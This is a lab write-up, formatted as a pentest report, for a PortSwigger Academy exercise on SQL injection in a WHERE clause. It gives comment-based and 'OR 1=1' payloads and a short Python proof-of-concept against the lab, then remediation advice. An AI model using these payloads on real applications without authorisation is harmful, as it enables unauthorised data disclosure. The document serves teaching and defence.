# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

---

## Executive Summary

During a controlled assessment of the target e-commerce application, we identified a **SQL injection vulnerability in the `WHERE` clause** of the product-listing endpoint. By manipulating the `category` URL parameter, we were able to bypass the application’s release filter and ultimately enumerate the entire `products` table—including items the business intended to keep hidden. Left unresolved, an attacker could extract sensitive business data or pivot to more destructive actions (e.g., authentication bypass, data tampering).

---

## Technical Details

| Item                        | Detail                                                                                                             |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| **Vulnerability class**     | SQL Injection – Boolean-based (string termination + inline comment)                                                |
| **Affected parameter**      | `category` (GET)                                                                                                   |
| **Database flavor**         | MySQL (confirmed by syntax behaviour)                                                                              |
| **Lab reference**           | PortSwigger Web Security Academy – *SQL injection vulnerability in WHERE clause allowing retrieval of hidden data* |
| **Difficulty rating (lab)** | Apprentice                                                                                                         |
| **Proof-of-concept script** | `script.py` (Python 3, `requests` library)                                                                         |

---

### 1  Understanding the Baseline Query

The application constructs its catalogue page with the following server-side query:

```sql
SELECT * 
FROM   products 
WHERE  category = '<PARAM>' 
  AND  released  = 1;
```

* `category` is **unsafely concatenated** from the URL.
* `released=1` is intended to hide unreleased items.

---

### 2  Establishing Normal Behaviour

**Action** – Browse to `/?category=Pets`
**Observation** – Page renders **three** pet-related products (expected baseline).

---

### 3  Neutralising the `released` Filter (Inline Comment)

**Payload** – `Pets'--`
**URL-encoded** – `Pets%27--`

Resulting query:

```sql
SELECT * 
FROM   products 
WHERE  category = 'Pets'--' AND released = 1;
```

* Everything after `--` is a comment.
* The stray closing quote (`'`) is safely ignored inside the comment.

**Outcome** – **Four** products returned ⇒ filter successfully bypassed.

---

### 4  Enumerating All Products (Boolean 1 = 1)

**Payload** – `Pets' OR 1=1--`
**URL-encoded** – `Pets%27%20OR%201%3D1--`

Injected query:

```sql
SELECT * 
FROM   products 
WHERE  category = 'Pets' OR 1=1--' AND released = 1;
```

* `1=1` is always true, so the predicate matches every row.
* `released` condition remains commented.

**Outcome** – **All** products displayed, including unreleased SKUs.

---

### 5  Automated Proof of Concept

```python
"""
script.py – PoC for SQLi in `category` parameter
"""
import requests, urllib.parse

LAB_URL = "https://<lab-id>.web-security-academy.net"
s = requests.Session()

payload = "Pets' OR 1=1--"
encoded = urllib.parse.quote(payload, safe='')
r = s.get(f"{LAB_URL}/?category={encoded}", timeout=10)

print(f"HTTP {r.status_code}")
print(f"Returned products: {r.text.count('<li class=\"product\">')}")
```

Running the script confirms the manual findings: the response contains every product row.

---

## Impact

| Risk                                 | Explanation                                                                                                                             |
| ------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------- |
| **Sensitive data disclosure**        | Internal-only SKUs, future product lines, or pricing strategies could leak.                                                             |
| **Privilege escalation vector**      | SQLi often allows UNION-based exfiltration, credential dumping, or even SSH key harvesting if `LOAD_FILE`/`INTO OUTFILE` are permitted. |
| **Regulatory & reputational damage** | Exposure of confidential catalogue data can lead to competitive disadvantage and potential violation of disclosure obligations.         |

Likelihood: **High**  Impact: **Medium–High**  Overall risk: **High**

---

## Recommended Remediation

1. **Use parameterised queries / prepared statements** for *all* SQL interactions.
2. Implement **server-side allow-lists** (e.g., validate `category` against canonical IDs rather than free text).
3. Employ a **Web Application Firewall (WAF)** rule set tuned for SQLi signatures as a compensating control.
4. **Regression test** using automated scanners plus manual verification before deployment.

> *After remediation, re-run the PoC to confirm the injected payloads return identical product counts to the baseline.*

---

## Conclusion

The identified SQL injection stems from direct string concatenation of user input in the `WHERE` clause. By adding a comment marker (`--`) and a tautology (`OR 1=1`), we demonstrated full disclosure of hidden product data and showed how an attacker could easily expand this foothold. Implementing prepared statements and rigorous input validation will eliminate this vulnerability.

Please reach out if further clarification or live demonstration is required.

---
